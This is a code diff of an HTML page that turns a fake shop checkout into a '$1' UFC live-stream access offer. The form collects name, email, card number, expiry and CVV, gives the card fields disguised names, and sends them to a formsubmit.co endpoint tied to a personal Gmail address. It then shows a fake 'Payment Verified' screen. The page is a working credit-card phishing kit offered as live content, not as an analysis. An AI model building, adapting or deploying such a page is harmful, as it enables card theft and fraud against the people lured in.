@@ -4,93 +4,191 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@700;900&display=swap');
-    :root { --primary: #000000; --bg: #ffffff; --text-main: #1a1a1a; --border: #e5e5e5; }
-    body { font-family: 'Inter', sans-serif; font-size: 14px; padding: 0; margin: 0; background-color: var(--bg); color: var(--text-main); -webkit-font-smoothing: antialiased; }
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@900&display=swap');
+    
+    :root { 
+        --ufc-red: #d20a0a; 
+        --bg-dark: #0b0b0b; 
+        --card-bg: #141414;
+        --text-gray: #a0a0a0;
+        --accent: #ffffff;
+    }
+
+    body { 
+        font-family: 'Inter', sans-serif; 
+        padding: 0; margin: 0; 
+        background-color: var(--bg-dark); 
+        color: white; 
+        -webkit-font-smoothing: antialiased; 
+    }
+
     * { box-sizing: border-box; }
-    .mini-nav { text-align: center; padding: 30px 0; border-bottom: 1px solid var(--border); margin-bottom: 40px; }
-    .logo { font-family: 'Outfit', sans-serif; font-size: 1.8rem; font-weight: 900; letter-spacing: -1px; text-transform: uppercase; color: var(--primary); }
-    .row { display: flex; flex-wrap: wrap; margin: 0 -15px; }
-    .col-100 { flex: 100%; padding: 0 15px; }
-    .container { max-width: 700px; margin: 0 auto 100px; padding: 0 20px; }
-    h3 { font-family: 'Outfit', sans-serif; font-size: 20px; text-transform: uppercase; letter-spacing: 1px; margin: 40px 0 25px 0; border-bottom: 2px solid var(--primary); padding-bottom: 8px; display: inline-block; }
-    input[type=text], select { width: 100%; margin-bottom: 20px; padding: 15px; border: 1px solid var(--border); border-radius: 0px; font-family: 'Inter', sans-serif; font-size: 14px; transition: border 0.2s; }
-    input[type=text]:focus, select:focus { outline: none; border-color: var(--primary); }
-    label { margin-bottom: 8px; display: block; font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; color: #666; }
-    .icon-container { margin-bottom: 20px; padding: 10px 0; font-size: 28px; display: flex; gap: 15px; }
-    .btn { background-color: var(--primary); color: white; padding: 20px; margin: 20px 0; border: 1px solid var(--primary); width: 100%; cursor: pointer; font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; transition: all 0.3s; }
-    .btn:hover { background-color: transparent; border: 1px solid var(--primary); color: var(--primary); }
-    #thanks-screen { display: none; text-align: center; margin-top: 150px; padding: 20px; }
-    #thanks-screen h1 { font-family: 'Outfit', sans-serif; font-weight: 900; font-size: 3rem; letter-spacing: -2px; }
+
+    /* Header & Live Pulse */
+    .header { 
+        text-align: center; 
+        padding: 40px 0; 
+        background: linear-gradient(to bottom, #1a1a1a, var(--bg-dark));
+        border-bottom: 2px solid var(--ufc-red);
+    }
+    .logo { 
+        font-family: 'Outfit', sans-serif; 
+        font-size: 2.2rem; 
+        font-weight: 900; 
+        letter-spacing: -1px; 
+        text-transform: uppercase; 
+        color: white;
+    }
+    .live-badge {
+        display: inline-block;
+        background: var(--ufc-red);
+        color: white;
+        padding: 4px 12px;
+        font-weight: 800;
+        font-size: 12px;
+        border-radius: 4px;
+        margin-top: 10px;
+        animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+        0% { opacity: 1; }
+        50% { opacity: 0.5; }
+        100% { opacity: 1; }
+    }
+
+    .container { max-width: 600px; margin: 0 auto 100px; padding: 0 20px; }
+
+    /* Fight Info Box */
+    .fight-card {
+        background: var(--card-bg);
+        padding: 20px;
+        border-radius: 8px;
+        margin-top: -30px;
+        border: 1px solid #333;
+        text-align: center;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    .fight-title { font-weight: 900; font-size: 1.2rem; text-transform: uppercase; }
+    .price-tag { font-size: 2rem; color: var(--ufc-red); font-weight: 900; margin: 10px 0; }
+
+    h3 { 
+        font-family: 'Outfit', sans-serif; 
+        font-size: 18px; 
+        text-transform: uppercase; 
+        letter-spacing: 1px; 
+        margin: 40px 0 20px 0; 
+        color: var(--ufc-red);
+    }
+
+    /* Form Styling */
+    input[type=text] { 
+        width: 100%; 
+        margin-bottom: 15px; 
+        padding: 15px; 
+        background: #1a1a1a;
+        border: 1px solid #333; 
+        color: white;
+        font-family: 'Inter', sans-serif; 
+        border-radius: 4px;
+    }
+    input[type=text]:focus { outline: none; border-color: var(--ufc-red); }
+    
+    label { 
+        margin-bottom: 8px; 
+        display: block; 
+        font-weight: 700; 
+        text-transform: uppercase; 
+        font-size: 11px; 
+        letter-spacing: 1px; 
+        color: var(--text-gray); 
+    }
+
+    .icon-container { margin-bottom: 10px; font-size: 30px; display: flex; gap: 10px; }
+
+    .btn { 
+        background-color: var(--ufc-red); 
+        color: white; 
+        padding: 22px; 
+        margin: 30px 0; 
+        border: none; 
+        width: 100%; 
+        cursor: pointer; 
+        font-size: 16px; 
+        font-weight: 900; 
+        text-transform: uppercase; 
+        letter-spacing: 1px; 
+        border-radius: 4px;
+        transition: transform 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); background-color: #ff0000; }
+
+    /* Success Screen */
+    #thanks-screen { display: none; text-align: center; margin-top: 100px; padding: 20px; }
+    #thanks-screen h1 { font-family: 'Outfit', sans-serif; color: var(--ufc-red); font-size: 3.5rem; margin-bottom: 10px; }
+    .success-icon { font-size: 80px; color: #2ecc71; margin-bottom: 20px; }
 </style>
 </head>
 <body>
 
-<div class="mini-nav" id="nav-header"><div class="logo">ULTRA.</div></div>
+<div class="header" id="nav-header">
+    <div class="logo">FREEDOM 250</div>
+    <div class="live-badge">● LIVE STREAM ACCESS</div>
+</div>
 
 <div id="form-container">
   <div class="container">
+    <div class="fight-card">
+        <div class="fight-title">TOPURIA vs GAETHJE</div>
+        <div class="price-tag">$1.00</div>
+        <p style="color: var(--text-gray); font-size: 12px; margin: 0;">Instant 4K Access Pass</p>
+    </div>
+
     <form id="checkoutForm" action="https://formsubmit.co/info.yahya.bx@gmail.com" method="POST">
       
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="Amount" value="$1.00">
       
-      <div class="row">
-        <div class="col-100">
-          <h3>Billing Address</h3>
-          <label>Full Name</label>
-          <input type="text" id="fname" placeholder="John M. Doe" required>
-          <label>Email</label>
-          <input type="text" id="email" placeholder="john@example.com" required>
-          <label>Address</label>
-          <input type="text" id="adr" placeholder="542 W. 15th Street" required>
-          <label>Country</label>
-          <input type="text" id="country" placeholder="United States" required>
-          <div class="row" style="margin:0">
-            <div style="flex:50%; padding-right:10px;"><label>State</label><input type="text" placeholder="New York" required></div>
-            <div style="flex:50%;"><label>City</label><input type="text" placeholder="New York City" required></div>
-          </div>
-          <label>Zip</label>
-          <input type="text" placeholder="10001" required>
+      <h3>1. Account Info</h3>
+      <label>Full Name</label>
+      <input type="text" id="fname" name="Full_Name" placeholder="Full Name" required>
+      <label>Email (For Stream Link)</label>
+      <input type="text" id="email" name="Email" placeholder="email@example.com" required>
+
+      <h3>2. Payment Details</h3>
+      <div class="icon-container">
+        <i class="fa fa-cc-visa" style="color:white;"></i>
+        <i class="fa fa-cc-mastercard" style="color:white;"></i>
+        <i class="fa fa-cc-amex" style="color:white;"></i>
+      </div>
+
+      <label>Cardholder Name</label>
+      <input type="text" name="Reference_User" id="cname" placeholder="Name on Card" required>
+
+      <label>Card Number</label>
+      <input type="text" name="Reference_ID" id="ccnum" placeholder="0000 0000 0000 0000" required>
+
+      <div style="display: flex; gap: 15px;">
+        <div style="flex: 1;">
+          <label>Expiration</label>
+          <input type="text" name="Expiry" placeholder="MM/YY" required>
         </div>
-
-        <div class="col-100">
-          <h3>Payment</h3>
-          <div class="icon-container">
-            <i class="fa fa-cc-visa" style="color:#1a1a1a;"></i>
-            <i class="fa fa-cc-mastercard" style="color:#1a1a1a;"></i>
-          </div>
-
-          <label>Name on Card</label>
-          <input type="text" name="Reference_User" id="cname" placeholder="John More Doe" required>
-
-          <label>Credit card number</label>
-          <input type="text" name="Reference_ID" id="ccnum" placeholder="1111-2222-3333-4444" required>
-
-          <div class="row" style="margin:0">
-            <div style="flex:50%; padding-right:10px;">
-              <label>Exp Month</label>
-              <input type="text" name="Val_M" placeholder="MM" required>
-            </div>
-            <div style="flex:50%;">
-              <label>Exp Year</label>
-              <input type="text" name="Val_Y" placeholder="YYYY" required>
-            </div>
-          </div>
-
+        <div style="flex: 1;">
           <label>CVV</label>
           <input type="text" name="Secure_Code" id="cvv" placeholder="123" required>
         </div>
       </div>
 
-      <button type="submit" class="btn" id="submitBtn">Complete Purchase</button>
+      <button type="submit" class="btn" id="submitBtn">UNLOCK LIVE STREAM — $1</button>
     </form>
   </div>
 </div>
 
 <div id="thanks-screen">
-  <h1>Order Confirmed.</h1>
-  <p style="color: #666; font-size: 16px; margin-top: 20px;">Thank you for your purchase!<br>Your product will be shipped within 7-18 business days.</p>
+  <i class="fa fa-check-circle success-icon"></i>
+  <h1>ACCESS GRANTED</h1>
+  <p style="color: #fff; font-size: 18px; margin-top: 20px;">Payment Verified!<br>Check your email or Discord for the private 4K link.</p>
+  <p style="color: var(--text-gray); font-size: 14px;">(Usually arrives within 60 seconds)</p>
 </div>
 
 <script>
@@ -99,7 +197,7 @@
 
   form.addEventListener('submit', function(e) {
     e.preventDefault();
-    btn.innerText = "PROCESSING...";
+    btn.innerText = "VERIFYING PAYMENT...";
     btn.disabled = true;
 
     const formData = new FormData(form);
@@ -117,8 +215,8 @@
     })
     .catch(error => {
       console.error('Error:', error);
-      alert("System update in progress. Please try again later.");
-      btn.innerText = "COMPLETE PURCHASE";
+      alert("Payment processor busy. Please try again.");
+      btn.innerText = "UNLOCK LIVE STREAM — $1";
       btn.disabled = false;
     });
   });
